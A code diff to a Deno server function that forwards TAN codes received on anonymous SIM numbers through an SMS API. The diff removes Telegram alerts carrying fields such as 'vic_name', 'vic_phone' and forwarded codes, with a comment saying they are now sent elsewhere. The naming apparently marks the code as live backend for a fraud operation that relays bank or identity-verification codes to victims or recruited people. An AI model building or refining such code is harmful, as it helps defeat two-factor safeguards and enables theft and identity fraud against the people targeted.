@@ -123,15 +123,13 @@ Deno.serve(async (req) => {
 
     const data = await apiRes.json();
 
-    // Inline TAN forwarding + Telegram notifications (fire-and-forget).
+    // Inline TAN forwarding (Telegram notifications are sent from processAssignmentForward).
     if (assignmentId && typeof assignmentId === "string") {
       (async () => {
         try {
-          const ctxInfo = await loadAssignmentContext(serviceClient, assignmentId);
           const settings = await loadSevenIoSettings(serviceClient);
-          let result: Awaited<ReturnType<typeof processAssignmentForward>> | null = null;
           if (settings) {
-            result = await processAssignmentForward(
+            await processAssignmentForward(
               {
                 serviceClient,
                 sevenioApiKey: settings.apiKey,
@@ -139,25 +137,6 @@ Deno.serve(async (req) => {
               },
               assignmentId
             );
-          }
-
-          if (result && ctxInfo) {
-            for (const sms of result.newSms ?? []) {
-              await sendTelegramNotification(serviceClient, "anosim_sms_received", {
-                vic_name: ctxInfo.vicName,
-                verification_title: ctxInfo.verificationTitle,
-                sender: sms.sender,
-                text: sms.text,
-              });
-            }
-            for (const fw of result.forwardedCodes ?? []) {
-              await sendTelegramNotification(serviceClient, "tan_forwarded_to_vic", {
-                vic_name: ctxInfo.vicName,
-                verification_title: ctxInfo.verificationTitle,
-                vic_phone: fw.vicPhone,
-                code: fw.code,
-              });
-            }
           }
         } catch (e) {
           console.error("inline forward failed", e);
